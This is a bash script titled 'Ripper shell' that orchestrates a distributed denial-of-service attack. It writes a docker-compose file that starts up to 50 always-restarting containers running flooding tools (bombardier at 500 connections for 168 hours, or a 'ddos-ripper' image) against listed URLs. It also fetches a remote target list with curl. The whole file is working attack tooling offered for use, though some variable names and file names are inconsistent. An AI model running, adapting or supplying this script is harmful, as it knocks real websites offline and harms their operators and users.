#!/bin/bash
# Ripper shell v1.0

VERSION='1.0'

TARGETS_URL='https://raw.githubusercontent.com/jeka-mel/bump/main/urls.txt'


print_help () {
  echo "Usage: os_x_ripper.sh --file urls.txt"
  echo "--file|-f - filename where urls are located"
}

print_version () {
  echo $VERSION
}

check_dependencies () {
  if $(docker -v | grep "Docker"); then
    echo "Please install docker first. https://www.docker.com/products/docker-desktop"
    exit 1
  fi
}

check_params () {
  if [ -z ${mode+x} ]; then
    echo -e "Mode is unset, setting to install runmode"
    mode=install
  fi
}

generate_compose_light () {
  if [ -z ${amount} ]; then
    echo -e "Amount of containers not set, setting to maximum of 50"
    amount=50
  fi
  echo "version: '3'" > docker-compose.yml
  echo "services:" >> docker-compose.yml
  counter=1
  while read -r site_url; do
    if [ $counter -le $amount ]; then
        if [ ! -z $site_url ]; then
          echo "  ddos-runner-$counter:" >> docker-compose.yml
          echo "    image: alpine/bombardier:latest" >> docker-compose.yml
          echo "    restart: always" >> docker-compose.yml
          echo "    command: -c 500 -d 168h $site_url" >> docker-compose.yml
          counter=$((counter+1))
        fi
    fi
  done < urls.txt
}

generate_compose () {
  if [ -z ${amount} ]; then
    echo -e "Amount of containers not set, setting to maximum of 50"
    amount=50
  fi
  echo "version: '3'" > docker-compose.yml
  echo "services:" >> docker-compose.yml
  counter=1
  while read -r site_url; do
    if [ $counter -le $amount ]; then
      if [ ! -z $site_url ]; then
          echo "  ddos-runner-$counter:" >> docker-compose.yml
          echo "    image: nitupkcuf/ddos-ripper:latest" >> docker-compose.yml
          echo "    restart: always" >> docker-compose.yml
          echo "    command: $site_url" >> docker-compose.yml
          counter=$((counter+1))
      fi
    fi
  done < urls.txt
}

ripper_start () {
  echo "Starting ripper attack"
  docker-compose up -d
}

ripper_stop () {
  echo "Stopping ripper attack"
  docker-compose down
}

while test -n "$1"; do
  case "$1" in
  --help|-h)
    print_help
    exit
    ;;
  --file|-f)
    FILE=$2
    shift
    ;;
  --mode|-m)
    MODE=$2
    shift
    ;;
  *)
    echo "Unknown argument: $1"
    print_help
    exit
    ;;
  esac
  shift
done

curl --silent $TARGETS_URL --output targets.txt

check_dependencies
check_params

case $MODE in
  full)
    generate_compose
    ripper_start
    ;;
  light)
    generate_compose_light
    ripper_start
  ;;
  start)
    ripper_start
    ;;
  stop)
    ripper_stop
    ;;
  reinstall)
    ripper_stop
    generate_compose
    ripper_start
    ;;
  *)
    echo "Wrong mode"
    exit 1
esac